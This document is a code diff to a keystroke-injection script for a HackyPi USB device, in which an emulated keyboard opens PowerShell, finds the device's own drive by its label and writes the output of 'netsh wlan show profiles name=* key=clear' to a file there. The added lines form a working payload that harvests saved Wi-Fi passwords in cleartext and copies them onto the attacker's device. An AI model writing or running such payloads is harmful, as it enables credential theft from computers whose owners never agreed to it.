@@ -93,9 +93,32 @@ try:
     keyboard.send(Keycode.F11)
     time.sleep(1.2)
     
-    #commands are OS specific make sure to provide correct commands
-    keyboard_layout.write("netsh wlan show profiles name=* key=clear") 
+    #Find and Enter HackyPi Drive
+
+    keyboard_layout.write("powershell")
     keyboard.send(Keycode.ENTER)
+    keyboard_layout.write("$scriptDrive = Get-Volume -FileSystemLabel HACKYPI")
+    keyboard.send(Keycode.ENTER)
+    keyboard_layout.write("$scriptDriveLetter = $scriptDrive.DriveLetter")
+    keyboard.send(Keycode.ENTER)
+    keyboard_layout.write("$scriptDriveLetterFull = $scriptDriveLetter + ':' ")
+    keyboard.send(Keycode.ENTER)
+    keyboard_layout.write("cd $scriptDriveLetterFull")
+    keyboard.send(Keycode.ENTER)
+    
+    #Export WiFiPasswords
+    keyboard_layout.write("netsh wlan show profiles name=* key=clear > file.txt") 
+    keyboard.send(Keycode.ENTER)
+    
+  
+  
+
+    
+
+    
+    
+    #keyboard_layout.write("exit") 
+    #keyboard.send(Keycode.ENTER)
     time.sleep(1)
     
     
